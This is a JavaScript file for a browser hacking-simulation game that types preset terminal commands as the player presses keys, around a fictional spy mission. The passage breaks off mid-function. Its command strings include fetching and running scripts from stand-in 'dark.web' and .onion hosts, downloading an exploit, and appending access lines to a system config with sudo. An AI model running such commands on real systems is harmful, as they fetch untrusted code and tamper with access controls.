class NightfallHack {
    constructor() {
        this.currentPhase = 'connect';
        this.usernameText = 'PHOENIX_7';
        this.passwordText = '**********';
        this.currentUsername = '';
        this.currentPassword = '';
        this.keyPressCount = 0;
        this.terminalCommands = [
            'nmap -sS -O nightfall.internal.gov',
            'wget https://dark.web/tools/auth_bypass.sh -O /tmp/bypass.sh',
            'chmod +x /tmp/bypass.sh && ./tmp/bypass.sh --target nightfall_auth'
        ];
        this.currentCommand = 0;
        this.terminalKeyCount = 0;
        this.privilegeEscalationCommands = [
            'wget https://exploitdb.com/download/51247 -O /tmp/priv_esc.py',
            'python3 /tmp/priv_esc.py --target nightfall_db --escalate',
            'echo "phoenix_7:omega_clearance" | sudo tee -a /etc/nightfall/access.conf'
        ];
        this.currentPrivilegeCommand = 0;
        this.privilegeKeyCount = 0;
        this.decryptionCommands = [
            'gcc -o aes_decrypt aes_decrypt.c -lcrypto -lssl',
            './aes_decrypt --input OPERATION_MIDNIGHT.dat --key nightfall_master_key --output decrypted.txt',
            'cat decrypted.txt'
        ];
        this.currentDecryptCommand = 0;
        this.encryptedHexData = '';
        this.decryptedData = '';
        this.decryptionKeyTries = 0;
        this.postDecryptionFailureKeyCount = 0;
        this.fullscreenRequested = false; // Track if we've requested fullscreen yet
        this.fullscreenListenersAdded = false; // Track if we've added fullscreen listeners
        
        this.checkDebugStep();
        this.init();
    }

    init() {
        document.addEventListener('keydown', (e) => this.handleKeyPress(e));
        document.addEventListener('click', (e) => this.handleClick(e));
        
        // Set up login interface if we're starting at username phase
        if (this.currentPhase === 'username') {
            this.focusUsername();
        }
    }

    requestFullscreen() {
        // Request fullscreen mode
        const element = document.documentElement;
        
        console.log('Requesting fullscreen...');
        
        if (element.requestFullscreen) {
            element.requestFullscreen().then(() => {
                console.log('Fullscreen request successful');
            }).catch(err => {
                console.error('Fullscreen request failed:', err);
            });
        } else if (element.mozRequestFullScreen) { // Firefox
            element.mozRequestFullScreen();
            console.log('Firefox fullscreen requested');
        } else if (element.webkitRequestFullscreen) { // Chrome, Safari, Opera
            element.webkitRequestFullscreen();
            console.log('Webkit fullscreen requested');
        } else if (element.msRequestFullscreen) { // IE/Edge
            element.msRequestFullscreen();
            console.log('MS fullscreen requested');
        } else {
            console.warn('Fullscreen API not supported');
        }
        
        // Listen for fullscreen change events (only add listeners once)
        if (!this.fullscreenListenersAdded) {
            this.fullscreenListenersAdded = true;
            document.addEventListener('fullscreenchange', () => this.handleFullscreenChange());
            document.addEventListener('mozfullscreenchange', () => this.handleFullscreenChange());
            document.addEventListener('webkitfullscreenchange', () => this.handleFullscreenChange());
            document.addEventListener('msfullscreenchange', () => this.handleFullscreenChange());
        }
    }

    handleFullscreenChange() {
        const isFullscreen = document.fullscreenElement || 
                           document.mozFullScreenElement || 
                           document.webkitFullscreenElement || 
                           document.msFullscreenElement;
        
        if (!isFullscreen) {
            console.log('Exited fullscreen mode');
        }
    }

    exitFullscreen() {
        if (document.exitFullscreen) {
            document.exitFullscreen();
        } else if (document.mozCancelFullScreen) { // Firefox
            document.mozCancelFullScreen();
        } else if (document.webkitExitFullscreen) { // Chrome, Safari, Opera
            document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) { // IE/Edge
            document.msExitFullscreen();
        }
    }

    focusUsername() {
        document.getElementById('username-cursor').style.display = 'inline-block';
        document.getElementById('password-cursor').style.display = 'none';
    }

    focusPassword() {
        document.getElementById('username-cursor').style.display = 'none';
        document.getElementById('password-cursor').style.display = 'inline-block';
    }

    hideAllCursors() {
        document.getElementById('username-cursor').style.display = 'none';
        document.getElementById('password-cursor').style.display = 'none';
    }

    handleKeyPress(e) {
        // Handle ESC key to exit fullscreen
        if (e.key === 'Escape' || e.keyCode === 27) {
            this.exitFullscreen();
            return; // Don't prevent default for ESC - let it work normally
        }
        
        // Don't handle keypresses on connect screen - only button clicks
        if (this.currentPhase === 'connect') {
            return;
        }
        
        // Don't intercept keypresses when input field is active (let HTML inputs work normally)
        if (this.inputActive) {
            return; // Don't prevent default - let the input field handle it
        }
        
        // Don't intercept keypresses when commands are executing
        if (this.commandExecuting || this.privilegeCommandExecuting || 
            this.decryptionCommandExecuting || this.cctvCommandExecuting || this.satelliteCommandExecuting ||
            this.virusCommandExecuting || this.facialScanActive || this.locatingActive) {
            e.preventDefault();
            return;
        }
        
        e.preventDefault();
        
        if (this.currentPhase === 'username') {
            this.handleUsernameTyping();
        } else if (this.currentPhase === 'password') {
            this.handlePasswordTyping();
        } else if (this.currentPhase === 'post-denied') {
            this.handlePostDeniedTyping();
        } else if (this.currentPhase === 'terminal') {
            this.handleTerminalTyping();
        } else if (this.currentPhase === 'privilege-denied') {
            this.handlePrivilegeDeniedTyping();
        } else if (this.currentPhase === 'privilege-terminal') {
            this.handlePrivilegeTerminalTyping();
        } else if (this.currentPhase === 'decryption-terminal') {
            this.handleDecryptionTerminalTyping();
        } else if (this.currentPhase === 'post-decryption-failure') {
            this.handlePostDecryptionFailureTyping();
        } else if (this.currentPhase === 'facial-recognition') {
            this.handleFacialRecognitionTyping();
        } else if (this.currentPhase === 'location-tracking') {
            this.handleLocationTrackingTyping();
        } else if (this.currentPhase === 'cctv-surveillance') {
            this.handleCCTVSurveillanceTyping();
        } else if (this.currentPhase === 'cctv-terminal') {
            this.handleCCTVTerminalTyping();
        } else if (this.currentPhase === 'satellite-terminal') {
            this.handleSatelliteTerminalTyping();
        } else if (this.currentPhase === 'virus-terminal') {
            this.handleVirusTerminalTyping();
        } else if (this.currentPhase === 'cctv-complete') {
            this.handleCCTVCompleteTyping();
        } else if (this.currentPhase === 'satellite-complete') {
            this.handleSatelliteCompleteTyping();
        }
    }

    handleClick(e) {
        // Handle connect button click
        if (e.target.id === 'connect-btn' || e.target.closest('#connect-btn')) {
            e.preventDefault();
            this.handleConnectClick();
            return;
        }
        
        if (this.currentPhase === 'console') {
            const targetFile = e.target.closest('.file-item[data-file="target"]');
            if (targetFile) {
                e.preventDefault();
                this.showInsufficientPrivileges();
            }
        } else if (this.currentPhase === 'console-upgraded') {
            const targetFile = e.target.closest('.file-item[data-file="target"]');
            if (targetFile) {
                e.preventDefault();
                this.showEncryptedFile();
            }
        }
        
        if (e.target.id === 'decrypt-btn') {
            e.preventDefault();
            this.showDecryptionKeyPrompt();
        }
        
        if (e.target.id === 'load-data-btn') {
            e.preventDefault();
            this.loadDataForAnalysis();
        }
        
    }

    handleConnectClick() {
        console.log('Connect button clicked');
        
        // Request fullscreen
        const element = document.documentElement;
        if (element.requestFullscreen) {
            element.requestFullscreen().then(() => {
                console.log('Fullscreen activated');
                this.proceedToLogin();
            }).catch(err => {
                console.error('Fullscreen failed:', err);
                // Proceed anyway even if fullscreen fails
                this.proceedToLogin();
            });
        } else if (element.webkitRequestFullscreen) {
            element.webkitRequestFullscreen();
            setTimeout(() => this.proceedToLogin(), 100);
        } else if (element.mozRequestFullScreen) {
            element.mozRequestFullScreen();
            setTimeout(() => this.proceedToLogin(), 100);
        } else if (element.msRequestFullscreen) {
            element.msRequestFullscreen();
            setTimeout(() => this.proceedToLogin(), 100);
        } else {
            // No fullscreen support, proceed anyway
            this.proceedToLogin();
        }
    }

    proceedToLogin() {
        // Hide connect screen and show login screen
        document.getElementById('connect-screen').classList.remove('active');
        document.getElementById('login-screen').classList.add('active');
        
        // Switch to username phase
        this.currentPhase = 'username';
        this.focusUsername();
    }

    handleUsernameTyping() {
        if (this.currentUsername.length < this.usernameText.length) {
            this.currentUsername += this.usernameText[this.currentUsername.length];
            document.getElementById('username').value = this.currentUsername;
            this.updateUsernameCursor();
            
            if (this.currentUsername.length === this.usernameText.length) {
                this.currentPhase = 'password';
                this.focusPassword();
            }
        }
    }

    handlePasswordTyping() {
        if (this.currentPassword.length < this.passwordText.length) {
            this.currentPassword += '*';
            document.getElementById('password').value = this.currentPassword;
            this.updatePasswordCursor();
            
            if (this.currentPassword.length === this.passwordText.length) {
                this.showAuthenticatingPopup();
            }
        }
    }

    handlePostDeniedTyping() {
        this.keyPressCount++;
        
        if (this.keyPressCount >= 30) {
            this.showTerminal();
        }
    }

    handleTerminalTyping() {
        if (this.currentCommand < this.terminalCommands.length) {
            const command = this.terminalCommands[this.currentCommand];
            const currentInput = document.getElementById('terminal-input').textContent;
            
            if (currentInput.length < command.length) {
                document.getElementById('terminal-input').textContent = command.substring(0, currentInput.length + 1);
                
                // Force scroll to bottom after each character
                const terminalContent = document.querySelector('.terminal-content');
                terminalContent.scrollTop = terminalContent.scrollHeight;
            } else {
                this.executeCurrentCommand();
            }
        }
    }

    updateUsernameCursor() {
        const cursor = document.getElementById('username-cursor');
        const textWidth = this.currentUsername.length * 9.6; // approximate character width
        cursor.style.left = (10 + textWidth) + 'px';
    }

    updatePasswordCursor() {
        const cursor = document.getElementById('password-cursor');
        const textWidth = this.currentPassword.length * 9.6; // approximate character width
        cursor.style.left = (10 + textWidth) + 'px';
    }

    showAuthenticatingPopup() {
        this.hideAllCursors();
        document.getElementById('authenticating-popup').classList.add('show');
        
        setTimeout(() => {
            document.getElementById('authenticating-popup').classList.remove('show');
            this.startAuthentication();
        }, 2000);
    }

    startAuthentication() {
        this.hideAllCursors();
        
        setTimeout(() => {
            this.showAccessDenied();
        }, 1500);
    }

    showAccessDenied() {
        document.getElementById('access-denied-popup').classList.add('show');
        
        setTimeout(() => {
            document.getElementById('access-denied-popup').classList.remove('show');
            this.currentPhase = 'post-denied';
            this.keyPressCount = 0;
        }, 3000);
    }

    showTerminal() {
        const terminal = document.getElementById('terminal-window');
        terminal.classList.add('show');
        this.currentPhase = 'terminal';
    }

    executeCurrentCommand() {
        // Prevent multiple executions of the same command
        if (this.commandExecuting) return;
        this.commandExecuting = true;
        
        const output = document.getElementById('terminal-output');
        const command = this.terminalCommands[this.currentCommand];
        
        // Hide the current input line and add command to output
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) inputLine.style.display = 'none';
        
        output.innerHTML += `<div class="terminal-line"><span class="prompt">root@nightfall:~$ </span>${command}</div>`;
        
        let response = '';
        switch(this.currentCommand) {
            case 0:
                response = 'Starting Nmap 7.94 ( https://nmap.org )<br>Host is up (0.012s latency).<br>22/tcp   open  ssh<br>80/tcp   open  http<br>443/tcp  open  https<br>8080/tcp open  http-proxy<br>OS: Linux 5.15.0-nightfall';
                break;
            case 1:
                response = '--2024-10-12 22:58:43--  https://dark.web/tools/auth_bypass.sh<br>Resolving dark.web... 192.168.1.100<br>Connecting to dark.web:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 2847 (2.8K) [application/x-sh]<br>Saving to: \'/tmp/bypass.sh\'<br><br>/tmp/bypass.sh      100%[===================>]   2.78K  --.-KB/s    in 0s<br><br>2024-10-12 22:58:43 (42.1 MB/s) - \'/tmp/bypass.sh\' saved [2847/2847]';
                break;
            case 2:
                response = '[+] Auth bypass script initiated<br>[+] Targeting nightfall_auth service<br>[+] Exploiting buffer overflow in auth module<br>[+] Shell spawned with elevated privileges<br>[+] ACCESS GRANTED';
                break;
        }
        
        output.innerHTML += `<div style="color: #00ffc4; margin-bottom: 10px;">${response}</div>`;
        
        // Scroll the terminal content container
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
        
        this.currentCommand++;
        document.getElementById('terminal-input').textContent = '';
        this.commandExecuting = false;
        
        // Show input line for next command if there is one
        if (this.currentCommand < this.terminalCommands.length) {
            const inputLine = document.querySelector('.terminal-line:has(#terminal-input)');
            if (inputLine) {
                inputLine.style.display = 'block';
                this.resetInputState();
            }
        }
        
        if (this.currentCommand >= this.terminalCommands.length) {
            setTimeout(() => {
                this.showAccessGranted();
            }, 1000);
        }
    }

    showAccessGranted() {
        document.getElementById('access-granted-popup').classList.add('show');
        
        setTimeout(() => {
            document.getElementById('access-granted-popup').classList.remove('show');
            document.getElementById('login-screen').classList.remove('active');
            document.getElementById('terminal-window').classList.remove('show');
            document.getElementById('main-console').classList.add('active');
            this.currentPhase = 'console';
        }, 3000);
    }

    checkDebugStep() {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        
        // Ensure clean initial state
        document.getElementById('connect-screen').classList.remove('active');
        document.getElementById('login-screen').classList.remove('active');
        document.getElementById('main-console').classList.remove('active');
        
        if (step === '1' || step === 'login') {
            // Skip to login screen
            document.getElementById('login-screen').classList.add('active');
            this.currentPhase = 'username';
        } else if (step === '2' || step === 'console') {
            // Skip to main console
            document.getElementById('main-console').classList.add('active');
            this.currentPhase = 'console';
        } else if (step === '3' || step === 'console-upgraded') {
            // Skip to main console with omega clearance
            document.getElementById('main-console').classList.add('active');
            this.currentPhase = 'console-upgraded';
            // Update clearance level in header
            const clearanceSpan = document.querySelector('.console-info span:nth-child(2)');
            clearanceSpan.textContent = 'CLEARANCE: OMEGA';
            clearanceSpan.style.color = '#00ffc4';
            // Remove lock icon and update target file
            const targetFile = document.querySelector('.file-item[data-file="target"]');
            const lockIcon = targetFile.querySelector('.file-icon');
            lockIcon.textContent = '📁';
        } else if (step === '4' || step === 'intelligence') {
            // Skip to intelligence interface (facial recognition)
            document.getElementById('intelligence-interface').classList.add('active');
            this.currentPhase = 'facial-recognition';
            this.commandInput = '';
            this.commandStep = 0;
            this.commands = [
                'facialrec --scan --database GLOBAL_INTEL_DB --algorithm DEEP_NEURAL --confidence 0.85 --target DR_MARCUS_STEELE'
            ];
            this.facialScanActive = false;
        } else if (step === '5' || step === 'location') {
            // Skip to intelligence interface (location tracking)
            document.getElementById('intelligence-interface').classList.add('active');
            this.currentPhase = 'location-tracking';
            this.commandInput = '';
            this.commandStep = 0;
            this.commands = [
                'locate --target STEELE_MARCUS --sat-grid OMEGA-7 --triangulate 47.2156N:8.4721E',
                'geotrack --enhance --zoom-level 15 --resolution HIGH --filter THERMAL', 
                'geotrack --enhance --zoom-level 25 --resolution MAXIMUM --pinpoint URBAN-CENTER'
            ];
            this.locationLevel = 'globe';
        } else if (step === '6' || step === 'cctv') {
            // Skip to intelligence interface (CCTV surveillance) 
            document.getElementById('intelligence-interface').classList.add('active');
            this.currentPhase = 'cctv-surveillance';
            this.commandInput = '';
            this.keyPressCount = 0;
        } else if (step === '7' || step === 'satellite') {
            // Skip to satellite communication phase
            document.getElementById('intelligence-interface').classList.add('active');
            document.getElementById('terminal-window').classList.add('show');
            document.getElementById('cctv-window').classList.add('show');
            this.currentPhase = 'satellite-terminal';
            this.satelliteCommands = [
                'satcom --connect --frequency 11.7GHz --satellite ASTRA-2G --uplink-auth OMEGA_7749',
                'satcom --handshake --encryption AES256 --key NIGHTFALL_MASTER_KEY_2024',
                'upload --data TARGET_INTEL.enc --destination SAFEHOUSE_ALPHA --priority URGENT'
            ];
            this.currentSatelliteCommand = 0;
            this.updateCCTVTimestamp();
            setInterval(() => this.updateCCTVTimestamp(), 1000);
        } else if (step === '8' || step === 'virus') {
            // Skip to final virus/destruction phase
            document.getElementById('intelligence-interface').classList.add('active');
            document.getElementById('terminal-window').classList.add('show');
            document.getElementById('cctv-window').classList.add('show');
            document.getElementById('satellite-window').classList.add('show');
            this.currentPhase = 'virus-terminal';
            this.virusCommands = [
                'wget https://darkweb.onion/tools/SYSTEM_DESTROYER.exe -O /tmp/destroyer.exe',
                'chmod +x /tmp/destroyer.exe && /tmp/destroyer.exe --target ALL --method CASCADE_FAILURE'
            ];
            this.currentVirusCommand = 0;
            this.updateCCTVTimestamp();
            setInterval(() => this.updateCCTVTimestamp(), 1000);
        } else {
            // Default: start at connect screen
            document.getElementById('connect-screen').classList.add('active');
            this.currentPhase = 'connect';
        }
    }

    showInsufficientPrivileges() {
        document.getElementById('insufficient-privileges-popup').classList.add('show');
        
        setTimeout(() => {
            document.getElementById('insufficient-privileges-popup').classList.remove('show');
            this.currentPhase = 'privilege-denied';
            this.privilegeKeyCount = 0;
        }, 3000);
    }

    handlePrivilegeDeniedTyping() {
        this.privilegeKeyCount++;
        
        if (this.privilegeKeyCount >= 25) {
            this.showPrivilegeTerminal();
        }
    }

    showPrivilegeTerminal() {
        const terminal = document.getElementById('terminal-window');
        terminal.classList.add('show');
        
        // Clear all previous terminal content
        document.getElementById('terminal-output').innerHTML = '';
        document.getElementById('terminal-input').textContent = '';
        
        // Ensure the input line is visible
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) {
            inputLine.style.display = 'block';
        }
        
        this.currentPhase = 'privilege-terminal';
        this.currentPrivilegeCommand = 0;
    }

    handlePrivilegeTerminalTyping() {
        if (this.currentPrivilegeCommand < this.privilegeEscalationCommands.length) {
            const command = this.privilegeEscalationCommands[this.currentPrivilegeCommand];
            const currentInput = document.getElementById('terminal-input').textContent;
            
            if (currentInput.length < command.length) {
                document.getElementById('terminal-input').textContent = command.substring(0, currentInput.length + 1);
                
                // Force scroll to bottom after each character
                const terminalContent = document.querySelector('.terminal-content');
                terminalContent.scrollTop = terminalContent.scrollHeight;
            } else {
                this.executePrivilegeCommand();
            }
        }
    }

    executePrivilegeCommand() {
        // Prevent multiple executions of the same command
        if (this.privilegeCommandExecuting) return;
        this.privilegeCommandExecuting = true;
        
        const output = document.getElementById('terminal-output');
        const command = this.privilegeEscalationCommands[this.currentPrivilegeCommand];
        
        // Hide the current input line and add command to output
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) inputLine.style.display = 'none';
        
        output.innerHTML += `<div class="terminal-line"><span class="prompt">root@nightfall:~$ </span>${command}</div>`;
        
        let response = '';
        switch(this.currentPrivilegeCommand) {
            case 0:
                response = '--2024-10-12 23:02:15--  https://exploitdb.com/download/51247<br>Resolving exploitdb.com... 192.99.17.150<br>Connecting to exploitdb.com:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4521 (4.4K) [application/x-python]<br>Saving to: \'/tmp/priv_esc.py\'<br><br>/tmp/priv_esc.py    100%[===================>]   4.41K  --.-KB/s    in 0s<br><br>2024-10-12 23:02:15 (38.7 MB/s) - \'/tmp/priv_esc.py\' saved [4521/4521]';
                break;
            case 1:
                response = '[+] Privilege escalation script loaded<br>[+] Targeting nightfall_db service<br>[+] Exploiting SUID binary vulnerability<br>[+] Local privilege escalation successful<br>[+] Root shell obtained';
                break;
            case 2:
                response = 'phoenix_7:omega_clearance<br>[+] Access configuration updated<br>[+] OMEGA_CLEARANCE_GRANTED<br>[+] All classified files now accessible';
                break;
        }
        
        output.innerHTML += `<div style="color: #00ffc4; margin-bottom: 10px;">${response}</div>`;
        
        // Scroll the terminal content container
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
        
        this.currentPrivilegeCommand++;
        document.getElementById('terminal-input').textContent = '';
        this.privilegeCommandExecuting = false;
        
        // Show input line for next command if there is one
        if (this.currentPrivilegeCommand < this.privilegeEscalationCommands.length) {
            const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
            if (inputLine) {
                inputLine.style.display = 'block';
                this.resetInputState();
                console.log('Showing input line for next command');
            }
        }
        
        if (this.currentPrivilegeCommand >= this.privilegeEscalationCommands.length) {
            this.upgradeConsoleAccess();
        }
    }

    upgradeConsoleAccess() {
        document.getElementById('terminal-window').classList.remove('show');
        
        // Show OMEGA access granted popup
        document.getElementById('omega-access-granted-popup').classList.add('show');
        
        setTimeout(() => {
            document.getElementById('omega-access-granted-popup').classList.remove('show');
            
            // Update clearance level in header
            const clearanceSpan = document.querySelector('.console-info span:nth-child(2)');
            clearanceSpan.textContent = 'CLEARANCE: OMEGA';
            clearanceSpan.style.color = '#00ffc4';
            
            // Remove lock icon and update target file
            const targetFile = document.querySelector('.file-item[data-file="target"]');
            const lockIcon = targetFile.querySelector('.file-icon');
            lockIcon.textContent = '📁';
            
            this.currentPhase = 'console-upgraded';
        }, 3000);
    }

    generateHexData() {
        // Generate the decrypted text first
        const secretText = `OPERATION MIDNIGHT - CLASSIFIED
=============================

TARGET: Dr. Marcus Steele
LOCATION: Nexus Research Facility, New Meridian
OBJECTIVE: Retrieve quantum encryption keys
STATUS: ACTIVE

INTELLIGENCE BRIEFING:
Dr. Steele has developed breakthrough quantum
encryption that could compromise all current
security protocols. Asset must be neutralized
and research data secured.

AUTHORIZATION: OMEGA CLEARANCE REQUIRED
CLASSIFICATION: EYES ONLY

DETAILED MISSION PARAMETERS:
- Infiltration Window: 23:00-05:00 GMT
- Security Level: Maximum
- Extraction Point: Roof access via maintenance
- Asset Cooperation: Unknown
- Backup Protocol: Phoenix contingency

ADDITIONAL INTELLIGENCE:
Subject maintains residence at 247 Blackstone Ave
Daily routine: Lab 08:00-20:00, Gym 20:30-21:30
Known associates: Dr. Sarah Chen (colleague)
Vehicle: Blue sedan, License: NM-4471-X
Security clearance: Level 9 (Quantum Division)
Personal habits: Coffee shop visits, evening jogs

OPERATIONAL NOTES:
Building has 24/7 security with biometric access
Labs are on floors 15-18, restricted access
Emergency protocols in place for asset retrieval
Quantum lab contains prototype encryption device
Backup data stored in off-site secure facility

MISSION TIMELINE:
Phase 1: Surveillance and reconnaissance
Phase 2: Security system infiltration
Phase 3: Asset approach and negotiation
Phase 4: Data extraction and secure transport
Phase 5: Facility cleanup and exit strategy

CONTINGENCY PROTOCOLS:
Alpha: Abort if security compromised
Beta: Extraction under hostile conditions
Gamma: Asset elimination if necessary
Delta: Data destruction to prevent exposure

EQUIPMENT MANIFEST:
- Quantum scanner device
- Encrypted communication gear
- Biometric bypass tools
- Emergency extraction kit
- Document analysis software

AUTHORIZATION CODES:
Primary: NIGHTFALL-7749-OMEGA
Secondary: PHOENIX-RISING-2024
Emergency: BLACKOUT-PROTOCOL-X

MISSION COMMANDER: Agent Phantom
FIELD OPERATIVE: Agent Shadow
TECHNICAL SUPPORT: Agent Cipher
EXTRACTION TEAM: Unit Raven

STATUS: MISSION APPROVED
DEPLOYMENT: IMMEDIATE
EXPECTED DURATION: 72 HOURS

END OF CLASSIFIED DOCUMENT`;
        
        this.decryptedData = secretText;
        
        // Generate encrypted hex data
        const hexChars = '0123456789ABCDEF';
        let hexData = '';
        
        for (let i = 0; i < 64; i++) {
            let line = `${i.toString(16).padStart(8, '0').toUpperCase()}: `;
            
            // Generate 16 bytes of hex data per line
            for (let j = 0; j < 16; j++) {
                const byte = hexChars[Math.floor(Math.random() * 16)] + hexChars[Math.floor(Math.random() * 16)];
                line += byte + ' ';
                if (j === 7) line += ' '; // Extra space in middle
            }
            
            // Add ASCII representation (all random chars)
            line += ' |';
            for (let j = 0; j < 16; j++) {
                const char = String.fromCharCode(33 + Math.floor(Math.random() * 94)); // Printable ASCII
                line += char;
            }
            line += '|';
            
            hexData += line + '\n';
        }
        
        this.encryptedHexData = hexData;
        return hexData;
    }

    showEncryptedFile() {
        const hexData = this.generateHexData();
        document.getElementById('hex-data').textContent = hexData;
        document.getElementById('encrypted-file-window').classList.add('show');
    }

    startDecryptionHack() {
        // Don't hide the encrypted file window - terminal opens on top
        
        // Show terminal for decryption
        const terminal = document.getElementById('terminal-window');
        terminal.classList.add('show');
        
        // Clear previous content
        document.getElementById('terminal-output').innerHTML = '';
        document.getElementById('terminal-input').textContent = '';
        
        // Ensure input line is visible
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) {
            inputLine.style.display = 'block';
        }
        
        this.currentPhase = 'decryption-terminal';
        this.currentDecryptCommand = 0;
    }

    handleDecryptionTerminalTyping() {
        if (this.currentDecryptCommand < this.decryptionCommands.length) {
            const command = this.decryptionCommands[this.currentDecryptCommand];
            const currentInput = document.getElementById('terminal-input').textContent;
            
            if (currentInput.length < command.length) {
                document.getElementById('terminal-input').textContent = command.substring(0, currentInput.length + 1);
                
                // Force scroll to bottom
                const terminalContent = document.querySelector('.terminal-content');
                terminalContent.scrollTop = terminalContent.scrollHeight;
            } else {
                this.executeDecryptionCommand();
            }
        }
    }

    executeDecryptionCommand() {
        if (this.decryptionCommandExecuting) return;
        this.decryptionCommandExecuting = true;
        
        const output = document.getElementById('terminal-output');
        const command = this.decryptionCommands[this.currentDecryptCommand];
        
        // Hide input line and add command to output
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) inputLine.style.display = 'none';
        
        output.innerHTML += `<div class="terminal-line"><span class="prompt">root@nightfall:~$ </span>${command}</div>`;
        
        let response = '';
        switch(this.currentDecryptCommand) {
            case 0:
                response = `#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;openssl/aes.h&gt;<br>#include &lt;openssl/evp.h&gt;<br><br>int decrypt_aes256(const char* input, const char* key, char* output) {<br>&nbsp;&nbsp;&nbsp;&nbsp;EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();<br>&nbsp;&nbsp;&nbsp;&nbsp;EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, NULL);<br>&nbsp;&nbsp;&nbsp;&nbsp;// ... decryption logic ...<br>&nbsp;&nbsp;&nbsp;&nbsp;return 0;<br>}<br><br>[+] Compilation successful`;
                break;
            case 1:
                response = '[+] AES-256 decryption initiated<br>[+] Using master key: nightfall_master_key<br>[+] Decrypting 2048 bytes...<br>[+] Cipher broken, plaintext recovered<br>[+] Output written to decrypted.txt';
                break;
            case 2:
                response = `<span style="color: #00ffdd;">OPERATION MIDNIGHT - CLASSIFIED<br>=============================<br><br>TARGET: Dr. Elena Vasquez<br>LOCATION: Quantum Research Lab, Geneva<br>OBJECTIVE: Retrieve quantum encryption keys<br>STATUS: ACTIVE<br><br>INTELLIGENCE BRIEFING:<br>Dr. Vasquez has developed breakthrough quantum<br>encryption that could compromise all current<br>security protocols. Asset must be neutralized<br>and research data secured.<br><br>AUTHORIZATION: OMEGA CLEARANCE REQUIRED<br>CLASSIFICATION: EYES ONLY</span>`;
                break;
        }
        
        output.innerHTML += `<div style="color: #00ffc4; margin-bottom: 10px;">${response}</div>`;
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
        
        this.currentDecryptCommand++;
        document.getElementById('terminal-input').textContent = '';
        this.decryptionCommandExecuting = false;
        
        // Show input line for next command
        if (this.currentDecryptCommand < this.decryptionCommands.length) {
            const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
            if (inputLine) {
                inputLine.style.display = 'block';
                this.resetInputState();
            }
        }
        
        if (this.currentDecryptCommand >= this.decryptionCommands.length) {
            // Hide terminal and start in-place decryption animation
            document.getElementById('terminal-window').classList.remove('show');
            this.startInPlaceDecryption();
        }
    }

    showDecryptionKeyPrompt() {
        document.getElementById('decryption-key-popup').classList.add('show');
        const keyInput = document.getElementById('decryption-key-input');
        keyInput.focus();
        
        // Temporarily disable our main keypress handler while input is active
        this.inputActive = true;
        this.keyInputCount = 0;
        
        // Add event listener for keyboard mashing
        keyInput.addEventListener('input', () => {
            this.keyInputCount++;
            // After 25 characters, automatically trigger decryption failure
            if (this.keyInputCount >= 25) {
                this.submitDecryptionKey();
            }
        });
    }

    submitDecryptionKey() {
        const keyInput = document.getElementById('decryption-key-input');
        const enteredKey = keyInput.value;
        
        document.getElementById('decryption-key-popup').classList.remove('show');
        keyInput.value = '';
        this.inputActive = false;
        
        this.decryptionKeyTries++;
        
        // Always fail the first try, regardless of what they enter
        if (this.decryptionKeyTries === 1) {
            this.showDecryptionFailed();
        } else {
            // On subsequent tries, start the animated decryption
            this.startAnimatedDecryption();
        }
    }

    showDecryptionFailed() {
        document.getElementById('decryption-failed-popup').classList.add('show');
        
        setTimeout(() => {
            document.getElementById('decryption-failed-popup').classList.remove('show');
            // Enter post-decryption-failure mode - need to type secret command
            this.currentPhase = 'post-decryption-failure';
            this.postDecryptionFailureKeyCount = 0;
        }, 3000);
    }

    handlePostDecryptionFailureTyping() {
        this.postDecryptionFailureKeyCount++;
        
        // After 20 keypresses, show the decryption hack terminal
        if (this.postDecryptionFailureKeyCount >= 20) {
            this.startDecryptionHack();
        }
    }

    startInPlaceDecryption() {
        // Update the file window header
        document.querySelector('#encrypted-file-window .file-header span').textContent = 'OPERATION_MIDNIGHT.dat - [DECRYPTING...]';
        
        // Get the hex display element
        const display = document.getElementById('hex-data');
        const hexLines = this.encryptedHexData.split('\n');
        const decryptedLines = this.decryptedData.split('\n');
        let currentLine = 0;
        
        const decryptLine = () => {
            if (currentLine < hexLines.length - 1) { // -1 because last line is empty
                // Build the display - mix of decrypted and remaining hex lines
                let displayContent = '';
                
                // Add decrypted lines that have been processed
                for (let i = 0; i < currentLine && i < decryptedLines.length; i++) {
                    displayContent += decryptedLines[i] + '\n';
                }
                
                // Add remaining hex lines that haven't been decrypted yet
                for (let i = currentLine; i < hexLines.length - 1; i++) {
                    displayContent += hexLines[i] + '\n';
                }
                
                display.textContent = displayContent;
                
                // Auto-scroll to show the current decryption progress
                const fileContent = document.querySelector('.file-content');
                if (fileContent) {
                    // Scroll to keep the current decryption line visible
                    const lineHeight = 14; // Approximate line height in pixels
                    const targetScroll = currentLine * lineHeight;
                    fileContent.scrollTop = Math.max(0, targetScroll - 200); // Keep some context above
                }
                
                currentLine++;
                setTimeout(decryptLine, 100);
            } else {
                // Decryption complete - show only the final decrypted text
                display.textContent = this.decryptedData;
                setTimeout(() => {
                    document.querySelector('#encrypted-file-window .file-header span').textContent = 'OPERATION_MIDNIGHT.dat - [DECRYPTED]';
                    display.style.color = '#00ffdd';
                    
                    // Replace decrypt button with load data button
                    const decryptBtn = document.getElementById('decrypt-btn');
                    decryptBtn.textContent = 'LOAD DATA';
                    decryptBtn.id = 'load-data-btn';
                    
                    this.currentPhase = 'file-decrypted';
                }, 500);
            }
        };
        
        decryptLine();
    }

    loadDataForAnalysis() {
        // Close the file window
